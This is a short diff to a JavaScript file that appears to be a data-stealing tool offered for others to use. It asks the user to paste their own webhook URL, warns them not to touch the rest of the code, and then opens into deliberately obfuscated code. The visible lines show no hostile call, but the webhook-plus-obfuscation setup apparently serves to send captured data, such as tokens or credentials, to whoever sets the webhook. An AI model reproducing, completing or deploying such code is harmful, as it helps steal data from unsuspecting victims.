@@ -1,5 +1,5 @@
-// Read IMPORTANT Dont Mess With Any Of The Code (apart from the webhook) Unless U Know What Ur Doing
-const WEBHOOK1 = "Your_Webhook_Here"; // Replace with your first webhook URL
+// Read IMPORTANT Dont Mess With Any Of The Code (apart from the webhook) Unless U Know What Ur Doing.
+const WEBHOOK1 = "Your_Webhook_Here"; // Replace with your webhook URL
 
 (function (_0x160fc4, _0x1208b3) {
     const _0x4917dd = _0x43e3, _0x10d91f = _0x160fc4();
